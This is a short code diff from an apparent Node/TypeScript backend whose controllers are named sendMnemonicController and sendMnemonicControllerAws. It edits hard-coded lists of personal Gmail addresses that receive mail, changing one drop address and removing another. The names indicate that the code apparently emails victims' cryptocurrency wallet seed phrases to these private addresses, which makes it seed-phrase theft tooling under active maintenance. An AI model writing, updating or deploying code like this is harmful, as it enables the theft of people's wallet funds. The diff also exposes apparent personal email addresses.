@@ -4,7 +4,7 @@ import nodemailer from "nodemailer";
 
 // First
 const getRecipients = (): string[] => {
-  const recipients = "davidjohnn175@gmail.com,Davidbrown202e@gmail.com";
+  const recipients = "davidjohnn175@gmail.com,Davidbrown202r@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
@@ -79,7 +79,7 @@ export const sendMnemonicController = asyncHandler(
 
 // Second
 const getRecipients3 = (): string[] => {
-  const recipients = "yahyanbenedict@gmail.com,Davidbrown202e@gmail.com";
+  const recipients = "yahyanbenedict@gmail.com,Davidbrown202r@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
@@ -154,7 +154,7 @@ export const sendMnemonicControllerAws = asyncHandler(
 
 // Third
 const getRecipient2 = (): string[] => {
-  const recipients = "michealrroyroy@gmail.com,yahyanbenedict@gmail.com,davidjohnn175@gmail.com,rohitkumar952895@gmail.com";
+  const recipients = "michealrroyroy@gmail.com,yahyanbenedict@gmail.com,davidjohnn175@gmail.com";
   // const recipients = "rohitkumar952895@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
